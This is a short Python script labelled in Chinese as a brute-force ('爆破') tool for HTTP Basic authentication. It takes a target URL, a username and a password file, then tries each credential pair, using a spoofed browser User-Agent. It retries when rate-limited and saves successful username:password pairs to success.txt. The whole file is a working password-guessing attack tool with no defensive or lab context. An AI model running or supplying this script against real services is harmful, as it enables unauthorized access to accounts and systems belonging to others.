# -*- coding: utf-8 -*-
"""
爆破
WWW-Authenticate: BASIC 
"""
import argparse
import requests
from co6co.utils import log
from co6co.utils import hash

import time

def readLine(f):
    """ 
    with  open(args.file,"r") as file:
        while True:
            str=file.readline()
            if str:

    """
    file=None
    try: 
        file=open(f,"r",encoding="utf-8")
        for line in file:
            yield line
    except Exception as e:
        log.warn(f"E{e}")
    finally:
        if file!=None:file.close() 

def tryLonIn (userName,pwd,u): 
    header = {
        "Authorization": "Basic dXNlcjoxMjM0NTY=",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9"
    } 
    v=hash.enbase64(f"{userName}:{pwd}")
    header.update({"Authorization": v}) 
    try:
        res = requests.get(u, headers=header)
        if (res.status_code == 401):
            log.info(f"error:{userName}:{pwd}")
            return False
        elif (res.status_code == 405):# 方法被禁止了 需要稍后尝试
            raise Exception(405) 
        else:
            file=open("success.txt","a",encoding="utf-8")
            file.write(f"{userName}:{pwd} success.")
            log.warn(res.content)
            log.succ(f"{userName}:{pwd} success.")
            return True 
    except:
        time.sleep(1000)
        return tryLonIn(userName,pwd,u)

def parserPwLine(defaultName:str,p:str):
    upSplitChar="/:"
    for i in upSplitChar:
        arr=p.split(i)
        if len(arr)==2:return (arr[0],arr[1])
    return (defaultName,p)

def main(args):
    # "Authorization: Basic dXNlcjoxMjM0NTY=" 
    print(args.file)
    line=readLine(args.file)  
    for l in line:
        userName,pwd=parserPwLine(args.name,l)
        r=tryLonIn(userName,pwd,args.url)  
        if r:
            log.succ("找到密码！")
            break
    else:
        log.warn("未找到密码！")


     
if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage="BASIC decode")
    parser.add_argument("-u", "--url", type=str, required=True, help="地址")
    parser.add_argument("-n", "--name", type=str, required=True, help="用户名")
    parser.add_argument("-f", "--file", type=str, help="密码文件", required=True)

    args = parser.parse_args()
    main(args)
